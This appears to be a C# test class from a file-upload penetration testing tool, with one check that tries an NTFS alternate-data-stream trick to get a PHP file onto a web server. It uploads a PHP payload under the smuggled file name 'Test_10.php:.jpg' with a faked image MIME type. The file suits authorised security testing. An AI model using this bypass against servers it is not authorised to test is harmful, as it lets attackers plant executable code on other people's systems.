using System.Text;
using System.Threading.Tasks;

/*
* Test #10
* Description: This test inserts a colon after the malicious extension and before the allowed one. This will create an alternate data stream for the php file (i.e. an empty php file will be created)
* It should be possible to create a php file with data in it.
*/
namespace Upsploit.Tests {
    class Test10 : Test {
        public override sealed string description { get; set; }
        public override sealed string validation { get; set; }

        public Test10() {
            description = "This test uploads a file (Test_10.php:.jpg) with the MIME type \"image/jpeg\". " +
              "The file is a php file with a colon before the extension, this will create an alternate data stream for the php file (i.e. an empty php file will be created)" +
              "\r\n\r\n" +
              "The test will work on servers using a vulnerable NTFS filesystem.";

            validation = "Look for Test_10.php on the web application. " +
                         "If the file exists, the test was a success and the web application is vulnerable.\r\n\r\n" +
                         "If the file no longer has the correct extension or displays an image, the test failed";
        }

        internal override async Task runTest(UploadRequest.UploadRequest request) {
            const string data = "<?php\n"
                                + "  echo phpinfo();\n"
                                + "?>";

            request.setFileData(Encoding.ASCII.GetBytes(data));
            request.setFileContentType("image/jpeg");
            request.setFileName("Test_10.php:.jpg");

            await request.send();
            printResult(request, "Test 10 (Alternate Data Stream)");
        }
    }
}
